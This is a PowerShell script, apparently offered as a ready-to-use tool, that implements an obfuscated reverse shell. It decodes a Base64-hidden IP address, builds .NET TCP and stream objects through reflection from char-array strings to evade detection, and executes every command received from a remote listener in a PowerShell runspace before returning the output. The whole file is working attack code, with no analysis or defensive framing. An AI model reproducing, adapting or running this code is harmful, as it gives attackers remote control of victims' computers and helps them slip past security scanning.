Write-Host "========================================" -ForegroundColor Cyan
Write-Host "PowerShell Reverse Shell" -ForegroundColor Yellow
Write-Host "Developed by Florent Vinai" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan

Write-Host "-Dynamic deobfuscation (Base64 + char arrays)" -ForegroundColor Yellow
Write-Host "-On-the-fly construction of .NET objects via reflection" -ForegroundColor Yellow
Write-Host "-TCP stream creation and data exchange over NetworkStream" -ForegroundColor Yellow
Write-Host "-Local execution of commands received over the network" -ForegroundColor Yellow
Write-Host "-Embedded PowerShell runspace interpreter handling" -ForegroundColor Yellow
Write-Host "-Automatic cleanup of streams and .NET resources" -ForegroundColor Yellow

Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

$K7mP3 = [Convert]::FromBase64String('MTkyLjE2OC4xLjEwMA=='); $H4xQ2 = -join [char[]]$K7mP3;
$N9vR5 = [int]([Math]::Pow(2,2) + [Math]::Pow(2,3) + [Math]::Pow(2,4) + [Math]::Pow(2,6) + [Math]::Pow(2,8) + [Math]::Pow(2,12));
$TpCl = ([Type](([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]78+[char]101+[char]116+[char]46+[char]83+[char]111+[char]99+[char]107+[char]101+[char]116+[char]115+[char]46+[char]84+[char]67+[char]80+[char]67+[char]108+[char]105+[char]101+[char]110+[char]116)));
$TpCtor = $TpCl.GetConstructor([type[]]@([string], [int]));

$m1p1 = [char]91 + [char]42 + [char]93 + [char]32 + [char]84 + [char]101 + [char]110 + [char]116 + [char]97 + [char]116 + [char]105 + [char]118 + [char]101 + [char]32 + [char]100 + [char]101 + [char]32 + [char]108 + [char]105 + [char]101 + [char]110 + [char]32 + [char]97 + [char]32
Write-Host "$m1p1$H4xQ2`:$N9vR5..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

try {
    $CnX = $TpCtor.Invoke(@($H4xQ2, $N9vR5));
    $connected = $CnX.GetType().GetProperty(([char]67+[char]111+[char]110+[char]110+[char]101+[char]99+[char]116+[char]101+[char]100)).GetValue($CnX)
    if ($connected) {
        $m2p1 = [char]91 + [char]43 + [char]93 + [char]32 + [char]76 + [char]105 + [char]101 + [char]110 + [char]32 + [char]101 + [char]116 + [char]97 + [char]98 + [char]108 + [char]105 + [char]32 + [char]97 + [char]118 + [char]101 + [char]99 + [char]32
        Write-Host "$m2p1$H4xQ2`:$N9vR5" -ForegroundColor Green
        Start-Sleep -Milliseconds 400
        $m3 = [char]91 + [char]42 + [char]93 + [char]32 + [char]83 + [char]101 + [char]114 + [char]118 + [char]105 + [char]99 + [char]101 + [char]32 + [char]97 + [char]99 + [char]116 + [char]105 + [char]102 + [char]32 + [char]45 + [char]32 + [char]86 + [char]111 + [char]117 + [char]115 + [char]32 + [char]112 + [char]111 + [char]117 + [char]118 + [char]101 + [char]122 + [char]32 + [char]109 + [char]97 + [char]105 + [char]110 + [char]116 + [char]101 + [char]110 + [char]97 + [char]110 + [char]116 + [char]32 + [char]101 + [char]120 + [char]101 + [char]99 + [char]117 + [char]116 + [char]101 + [char]114 + [char]32 + [char]100 + [char]101 + [char]115 + [char]32 + [char]99 + [char]111 + [char]109 + [char]109 + [char]97 + [char]110 + [char]100 + [char]101 + [char]115 + [char]32 + [char]100 + [char]101 + [char]112 + [char]117 + [char]105 + [char]115 + [char]32 + [char]118 + [char]111 + [char]116 + [char]114 + [char]101 + [char]32 + [char]115 + [char]101 + [char]114 + [char]118 + [char]101 + [char]117 + [char]114
        Write-Host "$m3" -ForegroundColor Cyan
        Start-Sleep -Milliseconds 400
        $m4 = [char]91 + [char]42 + [char]93 + [char]32 + [char]65 + [char]112 + [char]112 + [char]117 + [char]121 + [char]101 + [char]122 + [char]32 + [char]115 + [char]117 + [char]114 + [char]32 + [char]67 + [char]116 + [char]114 + [char]108 + [char]43 + [char]67 + [char]32 + [char]112 + [char]111 + [char]117 + [char]114 + [char]32 + [char]102 + [char]101 + [char]114 + [char]109 + [char]101 + [char]114 + [char]32 + [char]108 + [char]101 + [char]32 + [char]108 + [char]105 + [char]101 + [char]110
        Write-Host "$m4" -ForegroundColor Yellow
        Write-Host ""
    } else {
        $m5p1 = [char]91 + [char]45 + [char]93 + [char]32 + [char]69 + [char]99 + [char]104 + [char]101 + [char]99 + [char]32 + [char]100 + [char]101 + [char]32 + [char]108 + [char]97 + [char]32 + [char]108 + [char]105 + [char]101 + [char]110 + [char]32 + [char]97 + [char]32
        Write-Host "$m5p1$H4xQ2`:$N9vR5" -ForegroundColor Red
        $m6p1 = [char]91 + [char]42 + [char]93 + [char]32 + [char]86 + [char]101 + [char]114 + [char]105 + [char]102 + [char]105 + [char]101 + [char]122 + [char]32 + [char]113 + [char]117 + [char]101 + [char]32 + [char]108 + [char]101 + [char]32 + [char]108 + [char]105 + [char]115 + [char]116 + [char]101 + [char]110 + [char]101 + [char]114 + [char]32 + [char]101 + [char]115 + [char]116 + [char]32 + [char]97 + [char]99 + [char]116 + [char]105 + [char]102 + [char]32 + [char]115 + [char]117 + [char]114 + [char]32 + [char]118 + [char]111 + [char]116 + [char]114 + [char]101 + [char]32 + [char]115 + [char]101 + [char]114 + [char]118 + [char]101 + [char]117 + [char]114 + [char]32 + [char]40 + [char]110 + [char]99 + [char]32 + [char]45 + [char]110 + [char]108 + [char]118 + [char]112 + [char]32
        Write-Host "$m6p1$N9vR5)" -ForegroundColor Yellow
        exit
    }
} catch {
    $m7p1 = [char]91 + [char]45 + [char]93 + [char]32 + [char]69 + [char]114 + [char]114 + [char]101 + [char]117 + [char]114 + [char]32 + [char]108 + [char]111 + [char]114 + [char]115 + [char]32 + [char]100 + [char]101 + [char]32 + [char]108 + [char]97 + [char]32 + [char]108 + [char]105 + [char]101 + [char]110 + [char]58 + [char]32
    Write-Host "$m7p1$($_.Exception.Message)" -ForegroundColor Red
    $m8p1 = [char]91 + [char]42 + [char]93 + [char]32 + [char]86 + [char]101 + [char]114 + [char]105 + [char]102 + [char]105 + [char]101 + [char]122 + [char]32 + [char]113 + [char]117 + [char]101 + [char]32 + [char]108 + [char]101 + [char]32 + [char]108 + [char]105 + [char]115 + [char]116 + [char]101 + [char]110 + [char]101 + [char]114 + [char]32 + [char]101 + [char]115 + [char]116 + [char]32 + [char]97 + [char]99 + [char]116 + [char]105 + [char]102 + [char]32 + [char]115 + [char]117 + [char]114 + [char]32 + [char]118 + [char]111 + [char]116 + [char]114 + [char]101 + [char]32 + [char]115 + [char]101 + [char]114 + [char]118 + [char]101 + [char]117 + [char]114 + [char]32 + [char]40 + [char]110 + [char]99 + [char]32 + [char]45 + [char]110 + [char]108 + [char]118 + [char]112 + [char]32
    Write-Host "$m8p1$N9vR5)" -ForegroundColor Yellow
    exit
}

$NsT = $CnX.GetType().GetMethod(([char]71+[char]101+[char]116+[char]83+[char]116+[char]114+[char]101+[char]97+[char]109)).Invoke($CnX, $null);
$SrR = ([Type](([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]73+[char]79+[char]46+[char]83+[char]116+[char]114+[char]101+[char]97+[char]109+[char]82+[char]101+[char]97+[char]100+[char]101+[char]114)));
$SrCtor = $SrR.GetConstructor([type[]]@([System.IO.Stream]));
$RdT = $SrCtor.Invoke(@($NsT));
$SwR = ([Type](([char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]46+[char]73+[char]79+[char]46+[char]83+[char]116+[char]114+[char]101+[char]97+[char]109+[char]87+[char]114+[char]105+[char]116+[char]101+[char]114)));
$SwCtor = $SwR.GetConstructor([type[]]@([System.IO.Stream]));
$WrT = $SwCtor.Invoke(@($NsT));
$WrT.GetType().GetProperty(([char]65+[char]117+[char]116+[char]111+[char]70+[char]108+[char]117+[char]115+[char]104)).SetValue($WrT, $true, $null);

$PsH = [PowerShell]::Create();

while ($connected) {
    $connected = $CnX.GetType().GetProperty(([char]67+[char]111+[char]110+[char]110+[char]101+[char]99+[char]116+[char]101+[char]100)).GetValue($CnX)
    try {
        if ($NsT.GetType().GetProperty(([char]68+[char]97+[char]116+[char]97+[char]65+[char]118+[char]97+[char]105+[char]108+[char]97+[char]98+[char]108+[char]101)).GetValue($NsT)) {
            $Cmd = $RdT.GetType().GetMethod(([char]82+[char]101+[char]97+[char]100+[char]76+[char]105+[char]110+[char]101)).Invoke($RdT, $null);
            if ($Cmd -and $Cmd.Trim().Length -gt 0) {
                $null = $PsH.Commands.Clear();
                $null = $PsH.AddScript($Cmd);
                $Res = try { $PsH.Invoke() } catch { $_.Exception.GetType().GetProperty(([char]77+[char]101+[char]115+[char]115+[char]97+[char]103+[char]101)).GetValue($_.Exception) };
                $Out = if ($Res -is [Array]) { -join ($Res | ForEach-Object { $_.ToString() }) } else { if($Res) { $Res.ToString() } else { "" } };
                $WrT.GetType().GetMethod(([char]87+[char]114+[char]105+[char]116+[char]101+[char]76+[char]105+[char]110+[char]101), [type[]]@([string])).Invoke($WrT, @($Out));
            }
        } else {
            [System.Threading.Thread]::Sleep(100)
        }
    } catch {
        break
    }
}

$PsH.Dispose();

$m9 = [char]91 + [char]42 + [char]93 + [char]32 + [char]70 + [char]101 + [char]114 + [char]109 + [char]101 + [char]116 + [char]117 + [char]114 + [char]101 + [char]32 + [char]100 + [char]101 + [char]32 + [char]108 + [char]97 + [char]32 + [char]108 + [char]105 + [char]101 + [char]110 + [char]46 + [char]46 + [char]46
Write-Host ""
Write-Host "$m9" -ForegroundColor Yellow

$RdT.GetType().GetMethod(([char]67+[char]108+[char]111+[char]115+[char]101), [type[]]@()).Invoke($RdT, $null);
$WrT.GetType().GetMethod(([char]67+[char]108+[char]111+[char]115+[char]101), [type[]]@()).Invoke($WrT, $null);
$NsT.GetType().GetMethod(([char]67+[char]108+[char]111+[char]115+[char]101), [type[]]@()).Invoke($NsT, $null);
$CnX.GetType().GetMethod(([char]67+[char]108+[char]111+[char]115+[char]101), [type[]]@()).Invoke($CnX, $null)

$m10 = [char]91 + [char]43 + [char]93 + [char]32 + [char]76 + [char]105 + [char]101 + [char]110 + [char]32 + [char]102 + [char]101 + [char]114 + [char]109 + [char]101
Write-Host "$m10" -ForegroundColor Green